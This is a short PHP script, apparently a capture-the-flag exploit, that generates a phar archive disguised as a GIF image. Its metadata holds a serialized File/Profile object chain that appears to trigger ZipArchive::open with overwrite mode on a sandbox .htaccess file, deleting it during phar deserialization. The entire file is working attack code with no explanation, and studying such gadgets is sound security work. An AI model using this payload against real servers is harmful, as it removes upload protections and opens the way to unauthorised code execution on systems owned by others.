<?php
class File{
    public $filename;
    public $filepath;
    public $checker;

    function __construct() {
        $this->checker = new Profile();
    }
}

class Profile{
    public $username;
    public $password;
    public $admin;

    function __construct() {
        $this->username = "./sandbox/46c01c941bd10a9c3038752f7354f2e8/.htaccess";
        $this->password = "9";
        $this->admin = new ZipArchive();
    }
}


@unlink("poc.phar");
$phar = new Phar("poc.phar");
$phar->startBuffering();
$phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");
$o = new File();
$phar->setMetadata($o);
$phar->addFromString("test.txt", "123");
    //签名自动计算
$phar->stopBuffering();
?>